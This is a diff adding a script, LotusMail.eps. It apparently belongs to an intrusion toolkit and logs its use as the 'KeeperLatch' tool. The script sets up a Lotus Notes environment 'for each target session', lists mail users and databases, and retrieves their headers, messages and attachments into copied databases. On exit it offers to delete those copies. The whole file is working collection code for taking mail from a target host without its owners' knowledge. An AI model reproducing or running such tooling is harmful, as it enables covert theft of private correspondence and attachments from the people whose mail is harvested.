@@ -1,0 +1,187 @@
+#########################################################################
+#
+# File: LotusMail.eps
+#
+# Modifications:
+#  16 Jan 2004 Created
+#  17 May 2004 Modified
+#  09 Feb 2005 Modified menu option 3 to list mail users directly
+#              and changed main menu to retrieve headers, messages,
+#              or messages with attachments; moved filtering to
+#              sub-menu.
+#  10 May 2005 Removed Set Up Lotus Notes/Domino Environment as a menu option
+#              Environment is set up once for each target session
+#  23 Jan 2006 Added menu option to allow the entering of a single user/database
+#  25 Jan 2006 Added menu option to post process mail data
+#               
+#########################################################################
+
+@include "_FileExists.epm";
+@include "_RecordToolUse.epm";
+@include "Include\\SetupLotus.epm";
+@include "Include\\MailUsers.epm";
+@include "Include\\MailList.epm";
+
+_RecordToolUse("KeeperLatch", "KeeperLatch-Win32_1.0.4.1");
+
+string $commands;
+
+# commands
+$commands[0] = "Quit";
+$commands[1] = "Pause";
+$commands[2] = "Enter Mail User/Database";
+$commands[3] = "List Mail Users/Databases";
+$commands[4] = "Retrieve Mail Headers Only";
+$commands[5] = "Retrieve Mail Messages With Headers";
+$commands[6] = "Retrieve Mail Messages With Headers and Attachments";
+#$commands[7] = "Post Process";
+
+bool $LNPathFound=false;
+string $dataPath="";
+string $destDbName="";
+string $dbFile="";
+string $firstname="";
+string $lastname="";
+string $addr = "";
+string $dbFileStr="None Selected";
+string $usernameStr = "";
+string $addrStr = "";
+string %idHash;
+string $key;
+
+
+# Set up the Lotus Notes environment if it is not already set up
+$dataPath = GetEnv("kl_dataPath");
+bool $setup = true;
+if ($dataPath=="") {
+	ifnot (SetupLotusEnv($LNPathFound, $dataPath)) {
+   		echo "* Unable to setup lotus environment";
+		$setup = false;
+	}
+	else {
+		SetEnv("kl_lotusPathFound", "$LNPathFound");
+		SetEnv("kl_dataPath", "$dataPath");
+	}
+}
+
+
+while ($setup) {
+	$dbFileStr = GetEnv("kl_dbfile");
+	$usernameStr = GetEnv("kl_username");
+	$addrStr = GetEnv("kl_internetAddr");
+	$dataPath = GetEnv("kl_dataPath");
+	if ($dbFileStr == "") {
+    		$dbFileStr = "None Selected";
+	}
+	
+	string $curMailPath = splitPath($dbFileStr);
+	echo "\r\nCurrent Mail Database: $dbFileStr [$addrStr]\r\n";
+    	echo "Lotus Notes/Domino Mail Retrieval Options";
+   	echo "";
+   	int $i=0;
+
+	# print the command list
+    	while ($i < sizeof($commands)) {
+		echo "($i). $commands[$i]";
+		$i++;
+    	}
+
+    	echo "";
+   	int $choice = GetInput("Enter the desired option");
+
+	# Quit script
+    	if ($choice == 0) {
+		# Delete copies of mail database
+		string $thePath;
+		string $theFile;
+		bool $ok;
+		int $i = 0;
+		int $mailFileCnt = sizeof($destDbName);
+		while ($i < $mailFileCnt) {
+  			ifnot ($destDbName[$i] == "") {
+				if (prompt "\r\nDelete copy of mail database, $destDbName[$i]?") {
+					$thePath = splitPath($destDbName[$i]);
+					$theFile = $thePath[1];
+					$ok = `del "$theFile" -path "$thePath"`;
+					if ($ok) {
+						echo "$destDbName[$i] deleted successfully";
+						if ("$destDbName[$i]" == "$dbFileStr") {
+							$dbFileStr = "None Selected";
+							SetEnv("kl_dbfile", "");
+							SetEnv("kl_internetAddr", "");
+						}
+						$destDbName[$i] = "";
+					}
+				}
+			}
+			$i++;
+		}
+		return true;
+   	}
+
+	# Pause script
+	else if ($choice == 1) {
+		pause "to allow issuing of other EP commands";
+	}
+
+
+	# Change User or Select Mail User from List of Users/Databases
+	else if (($choice == 2) || ($choice == 3)) {
+		$LNPathFound = GetEnv("kl_lotusPathFound");
+		$dataPath = GetEnv("kl_dataPath");
+		ifnot (LotusMailUsers($LNPathFound, $dataPath, $dbFile, $firstname, $lastname, $addr, $choice)) {
+			echo "* Unable to list Lotus Notes Mail Users";
+		}
+		else {
+			undef (%idHash);
+		}
+	}
+			
+			
+	# Retrieve Mail Messages
+   	else if (($choice > 3) && ($choice < 7)) {
+		$LNPathFound = GetEnv("kl_lotusPathFound");
+		$dataPath = GetEnv("kl_dataPath");
+		$dbFileStr = GetEnv("kl_dbfile");
+		if ($dbFileStr=="") {
+       			ifnot (LotusMailUsers($LNPathFound, $dataPath, $dbFile, $firstname, $lastname, $addr, 3)) {
+				echo "* Unable to list Lotus Notes Mail Users";
+			}
+			else {
+				foreach $key (keys %idHash) {
+					%idHash{'$key'} = "";
+				}
+			}
+		}
+		else {			
+			ifnot (LotusMailList($LNPathFound, $dataPath, $dbFileStr, $choice, %idHash, $destDBName)) {
+				echo "* Unable to list mail messages";
+			}
+			else {
+				SetEnv("kl_dbfile", $dbFileStr);
+			}
+		}
+  	} 
+	#Post-process the lotusnotesparser xml file
+#	else if ($choice == 7) {
+#		if (`script KeeperLatch\\PostProcessCapture.eps`) {
+#			echo "Post Processing of captured files successful";
+#		}
+#		else {
+#			echo "* Unable to post process captured files";
+#		}
+#	}
+    	else {
+		echo "\r\nInvalid Menu Option -- Try Again\r\n";
+	}
+}
+
+	
+return true;
+
+
+
+
+
+
+
